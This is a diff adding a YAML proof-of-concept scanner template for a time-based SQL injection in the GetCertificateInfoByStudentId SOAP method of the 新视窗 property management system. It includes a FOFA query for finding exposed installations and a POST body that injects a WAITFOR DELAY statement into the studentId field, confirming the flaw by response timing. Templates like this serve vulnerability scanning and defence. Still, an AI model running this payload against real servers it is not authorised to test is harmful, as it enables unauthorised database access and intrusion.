@@ -1,0 +1,28 @@
+id: poc-yaml-new-window-getcertificateinfobystudentid-sqli
+info:
+  name: 新视窗新一代物业管理系统 GetCertificateInfoByStudentId SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 新视窗新一代物业管理系统
+  fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /loginV8.aspx?
+  expression: status_code == 200 && contains(body,"BPMSite/ClientSupport/OCXInstall.aspx")
+- method: POST
+  path: /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetCertificateInfoByStudentId
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n <soap:Body>\n <GetCertificateInfoByStudentId xmlns=\"http://tempuri.org/\"\
+    >\n<studentId>1;WAITFOR DELAY '0:0:{{.t1}}'--</studentId>\n</GetCertificateInfoByStudentId>\n\
+    </soap:Body>\n</soap:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,\"<GetCertificateInfoByStudentIdResult>\"\
+    ) &&\ncontains(headers,\"text/xml\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
